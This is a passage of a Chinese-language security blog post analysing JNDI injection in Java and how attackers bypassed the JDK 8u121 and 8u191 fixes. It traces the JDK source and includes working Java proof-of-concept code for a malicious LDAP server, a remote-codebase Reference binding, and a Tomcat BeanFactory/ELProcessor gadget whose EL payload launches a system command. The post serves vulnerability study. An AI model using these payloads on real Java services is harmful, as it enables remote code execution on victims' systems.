+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitialContext.lookup()</span><br><span class="line">    → GenericURLContext.lookup()</span><br><span class="line">        → RegistryContext.lookup()</span><br><span class="line">            → RegistryImpl_Stub.lookup()  // 网络请求，拿回 ReferenceWrapper_Stub</span><br><span class="line">                → decodeObject()           // 解包，还原出 Reference</span><br><span class="line">                    → NamingManager.getObjectInstance()  // 关键！</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="三、高版本绕过-8u121"><a href="#三、高版本绕过-8u121" class="headerlink" title="三、高版本绕过-8u121"></a>三、高版本绕过-<code>8u121</code></h2><h3 id="1-jdk8u121修复点"><a href="#1-jdk8u121修复点" class="headerlink" title="1.jdk8u121修复点"></a>1.<code>jdk8u121</code>修复点</h3><h4 id="1-1、版本问题"><a href="#1-1、版本问题" class="headerlink" title="1.1、版本问题"></a>1.1、版本问题</h4><p><strong>JDK 8u121 的核心修复点（针对 JNDI）是：默认禁用通过 RMI Registry &#x2F; COS Naming 的 JNDI 远程 class loading（URL codebase）</strong></p>
+<p><strong>以及 7u131、6u141版本</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251852051.png" alt="image-20260225185240007"></p>
+<h4 id="1-1、具体逻辑"><a href="#1-1、具体逻辑" class="headerlink" title="1.1、具体逻辑"></a>1.1、具体逻辑</h4><p>引入了一个系统属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.jndi.rmi.object.trustURLCodebase</span><br></pre></td></tr></table></figure>
+
+<p><strong>8u121 之前</strong>：默认 <code>true</code>，信任远程 codebase，可以随意加载<br><strong>8u121 之后</strong>：默认改为 <code>false</code>，不再信任远程 <code>codebase</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251856752.png" alt="image-20260225185650681" style="zoom:67%;" />
+
+<p><strong>具体函数逻辑如下</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251858721.png" alt="image-20260225185826653" style="zoom: 50%;" />
+
+<p><strong>也就变成了这个报错，不会在加载恶意类</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251859635.png" alt="image-20260225185920585" style="zoom:33%;" />
+
+<h3 id="2-绕过"><a href="#2-绕过" class="headerlink" title="2.绕过"></a>2.绕过</h3><h4 id="2-1、poc"><a href="#2-1、poc" class="headerlink" title="2.1、poc"></a>2.1、poc</h4><p>之前提到<code>ladp</code>也可以作为一种<code>JNDI</code>服务，而且代码恶意逻辑是公用的，这里只是禁用了俩种，所以直接使用<code>ladp</code>服务，如入无人之境</p>
+<p>这里我们使用<code>java</code>创建<code>ladp</code>的服务端</p>
+<p><strong>恶意</strong><code>ladp</code>服务端</p>
+<p><code>chuan/rmi/JNDILDAPServer.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(<span class="string">&quot;dc=example,dc=com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                <span class="number">1389</span>,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        config.setSchema(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键！先把父节点 dc=example,dc=com 创建出来</span></span><br><span class="line">        server.add(</span><br><span class="line">                <span class="string">&quot;dn: dc=example,dc=com&quot;</span>,</span><br><span class="line">                <span class="string">&quot;objectClass: top&quot;</span>,</span><br><span class="line">                <span class="string">&quot;objectClass: domain&quot;</span>,</span><br><span class="line">                <span class="string">&quot;dc: example&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        server.startListening();</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] LDAP Server 启动，监听 1389 端口，等待 bind...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Thread.currentThread().join();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>绑定</strong></p>
+<p><code>chuan/rmi/JNDILDAPBind.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPBind</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指定 LDAP 工厂和地址（对标 RMI 版 InitialContext 自动解析 rmi://）</span></span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>,    <span class="string">&quot;ldap://localhost:1389&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 和 RMI 版完全一样！</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;chuan&quot;</span>, <span class="string">&quot;chuan&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.bind(<span class="string">&quot;cn=remoteObj1,dc=example,dc=com&quot;</span>, refObj);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[*] bind 成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>客户端</strong></p>
+<p><code>chuan/rmi/JNDIRMIClient.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//            RemoteObj remoteObj  = (RemoteObj) initialContext.lookup(&quot;rmi://localhost:1099/remoteObj1&quot;);</span></span><br><span class="line">            <span class="type">RemoteObj</span> <span class="variable">remoteObj</span>  <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/cn=remoteObj1,dc=example,dc=com&quot;</span>);</span><br><span class="line">            System.out.println(remoteObj.sayHello(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-2、底层实现"><a href="#2-2、底层实现" class="headerlink" title="2.2、底层实现"></a>2.2、底层实现</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteObj</span> <span class="variable">remoteObj</span>  <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/cn=remoteObj1,dc=example,dc=com&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>javax/naming/InitialContext.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);******</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这一段依旧是判断分别，是哪一个服务</strong></p>
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\url\ldap\ldapURLContext.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.lookup(var1);******<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\toolkit\url\GenericURLContext.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());*******<span class="number">2</span></span><br><span class="line">            </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\toolkit\ctx\PartialCompositeContext.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;   </span><br><span class="line">        ***********<span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span>(var5 = var2.p_lookup(var6, var4); var4.isContinue(); var5 = var2.p_lookup(var6, var4)) &#123;       </span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\toolkit\ctx\ComponentContext.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">p_lookup</span><span class="params">(Name var1, Continuation var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            ***<span class="number">4</span></span><br><span class="line">            var3 = <span class="built_in">this</span>.c_lookup(var4.getHead(), var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>这里就是重要逻辑</strong></p>
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\ldap\LdapCtx.class</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252004517.png" alt="image-20260225200455354" style="zoom:67%;" />
+
+<p>这个<code>var4</code>应该是<code>attr</code>，这个是从<code>ladp</code>上获取的属性</p>
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\ldap\Obj.class</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252011174.png" alt="image-20260225201120064" style="zoom:50%;" />
+
+<ul>
+<li><p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u121\jre\lib\rt.jar!\com\sun\jndi\ldap\Obj.class</code>方法详解</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252018000.png" alt="image-20260225201849890" style="zoom: 50%;" /></li>
+</ul>
+<p>**然后回到 LdapCtx **</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252024911.png" alt="image-20260225202403777" style="zoom:50%;" />
+
+
+
+<p><code>javax/naming/spi/DirectoryManager.java</code></p>
+<p>这个工具类继承了<code>NamingManager</code>也就是<code>rmi</code>解析时用到的类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252028853.png" alt="image-20260225202824780"></p>
+<p><strong>因为子类没有这个方法，又回去调用父类也就是<code>NamingManager.java</code>中的</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252029164.png" alt="image-20260225202941063" style="zoom: 67%;" />
+
+
+
+
+
+<p><strong>在jdk8u191此漏洞确定被修复</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602252034127.png" alt="image-20260225203418035" style="zoom:67%;" />
+
+
+
+
+
+<h2 id="四、高版本绕过-8u191"><a href="#四、高版本绕过-8u191" class="headerlink" title="四、高版本绕过-8u191"></a>四、高版本绕过-8u191</h2><p><strong>环境</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">openjdk</span><br><span class="line">https://codeload.github.com/openjdk/jdk8u/zip/refs/tags/jdk8u191-b26</span><br><span class="line"></span><br><span class="line">oraclejdk</span><br><span class="line">https://download.oracle.com/otn/java/jdk/8u191-b12/</span><br><span class="line"></span><br><span class="line">pom文件引入tomcat</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;8.5.73&lt;/version&gt; &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;8.5.73&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-jdk8u191修复点"><a href="#1-jdk8u191修复点" class="headerlink" title="1.jdk8u191修复点"></a>1.<code>jdk8u191</code>修复点</h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261445371.png" alt="image-20260226144506165"></p>
+<p>JDK 8u191 的关键点不是第一次“提出限制”，而是把 <code>LDAP</code> 这条 <code>JNDI</code> 远程 <code>codebase</code> 加载限制真正收紧并默认关掉（<code>com.sun.jndi.ldap.object.trustURLCodebase=false</code>），并在类加载实现处做了显式判断，不再无条件创建 <code>URLClassLoader</code> 去加载远程类</p>
+<p><strong>源码修复在下面</strong></p>
+<p><code>LdapCtx</code>这个是当初后面解密时用到的，这里进入到包装工具类</p>
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u191\jre\lib\rt.jar!\com\sun\jndi\ldap\LdapCtx.class</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261454620.png" alt="image-20260226145435488"></p>
+<p><code>javax/naming/spi/DirectoryManager.java</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261456458.png" alt="image-20260226145645357"></p>
+<p><code>getObjectInstance</code>这个方法会调用父类<code>NamingManager#getObjectFactoryFromReference</code></p>
+<p><code>javax/naming/spi/NamingManager.java</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261458060.png" alt="image-20260226145815961" style="zoom:50%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261459278.png" alt="image-20260226145900140" style="zoom:50%;" />
+
+<p>接着会进行类加载，<strong>依旧是先本地后远程</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261502036.png" alt="image-20260226150241892" style="zoom:50%;" />
+
+<p><code>com/sun/naming/internal/VersionHelper12.java</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261503144.png" alt="image-20260226150338013" style="zoom:50%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261506464.png" alt="image-20260226150627343"></p>
+<p><strong>自此，jdk191之后，jndi注入完结！</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">客户端 lookup(&quot;ldap://...&quot;)</span><br><span class="line">    → LdapCtx 连接 LDAP 服务器</span><br><span class="line">    → 拿回 Entry（含 javaCodeBase / javaFactory 属性）</span><br><span class="line">    </span><br><span class="line">            ← 8u191 在这里插入拦截！←</span><br><span class="line">            Obj.decodeObject() 读到 codebase 不为 null</span><br><span class="line">            检查 trustURLCodebase → 默认 false</span><br><span class="line">            → 直接抛异常，流程结束</span><br><span class="line"></span><br><span class="line">        → NamingManager.getObjectInstance()  // 进不来了</span><br><span class="line">            → URLClassLoader 远程下载        // 进不来了 💥</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="2-绕过-1"><a href="#2-绕过-1" class="headerlink" title="2.绕过"></a>2.绕过</h3><h4 id="2-1、主要逻辑"><a href="#2-1、主要逻辑" class="headerlink" title="2.1、主要逻辑"></a>2.1、主要逻辑</h4><p><strong>既然限制了远程的危险类加载，于是我们尝试寻找一些本地的危险类</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261520275.png" alt="image-20260226152034139" style="zoom: 67%;" />
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以攻击者的目标变成了：找一个本地已有的类，它实现了 ObjectFactory，并且 getObjectInstance() 方法里有可以被利用的逻辑。</span><br></pre></td></tr></table></figure>
+
+<p><strong>即</strong><code>org/apache/naming/factory/BeanFactory.java</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261541570.png" alt="image-20260226154153499" style="zoom:67%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261545188.png" alt="image-20260226154521137"></p>
+<p>这个是<code>tomcat</code>中一个核心类，在常见<code>springboot</code>服务中可以直接调用</p>
+<p><strong>而且</strong></p>
+<p>在 Tomcat 的 <code>EL</code>（表达式语言）依赖库中，恰好有一个类叫 <code>javax.el.ELProcessor</code>。 它有一个方法叫 <code>eval(String expression)</code>，可以直接解析并执行一段 EL 表达式代码，而 EL 表达式是具备执行任意 Java 代码能力的！</p>
+<p><strong>于是构造如下服务端，让其想 rmi 服务中注册恶意引用，然后客户端调用时，直接爆炸</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ================= 开始组装 BeanFactory 本地绕过 Payload =================</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 使用 Tomcat 的 ResourceRef 替代普通的 Reference</span></span><br><span class="line">        <span class="comment">// 参数解释：目标类名(ELProcessor), 描述, scope, auth, forceString, 工厂类名(BeanFactory), 工厂类位置(留空!)</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(</span><br><span class="line">                <span class="string">&quot;javax.el.ELProcessor&quot;</span>,</span><br><span class="line">                <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,</span><br><span class="line">                <span class="literal">null</span> <span class="comment">// 核心：这里是 null，彻底绕开 trustURLCodebase 的远程下载限制！</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 配置 BeanFactory 的“后门”属性：forceString</span></span><br><span class="line">        <span class="comment">// 这句话的意思是：强制把属性 &#x27;x&#x27; 的值，作为参数传给 ELProcessor 的 &#x27;eval&#x27; 方法去执行</span></span><br><span class="line">        refObj.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 编写最终的武器：利用 JS 引擎执行系统命令弹出计算器的 EL 表达式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">elPayload</span> <span class="operator">=</span> <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将这段 EL 表达式作为属性 &#x27;x&#x27; 塞进去</span></span><br><span class="line">        refObj.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, elPayload));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========================================================================</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 将伪造好的 ResourceRef 绑定到 RMI 注册表上</span></span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://localhost:1099/remoteObj1&quot;</span>, refObj);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] 恶意 BeanFactory 引用已成功绑定至 rmi://localhost:1099/remoteObj1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] 等待受害者来 lookup...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261553468.png" alt="image-20260226155328398" style="zoom:33%;" />
+
